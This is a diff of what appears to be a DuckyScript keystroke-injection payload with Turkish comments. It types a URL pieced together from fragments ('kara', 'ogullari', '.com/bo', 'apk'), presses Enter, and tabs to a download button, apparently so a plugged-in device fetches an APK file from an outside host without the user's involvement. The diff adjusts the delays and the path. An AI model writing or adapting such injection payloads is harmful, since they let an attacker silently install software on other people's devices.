@@ -11,28 +11,29 @@ DELAY 300
 
 REM URL yazma (ASCII kodları kullanarak)
 STRING kara
-DELAY 400
+DELAY 300
 STRING ogullari
-DELAY 400
+DELAY 300
 
 REM Nokta (.) yazmak için SHIFT ile birlikte 0x37 kullanılır
 SHIFT 0x37
 DELAY 200
 STRING /
 DELAY 200
-STRING com
+STRING com/bo
 DELAY 500
-ENTER
-DELAY 6000
 
 REM Nokta (.) yazmak için SHIFT ile birlikte 0x37 kullanılır
 SHIFT 0x37
-DELAY 100
+DELAY 200
+STRING /
 
 STRING apk
 DELAY 300
 ENTER
 DELAY 5000
+
+ENTER
 
 REM İndirme butonuna tıklama
 TAB
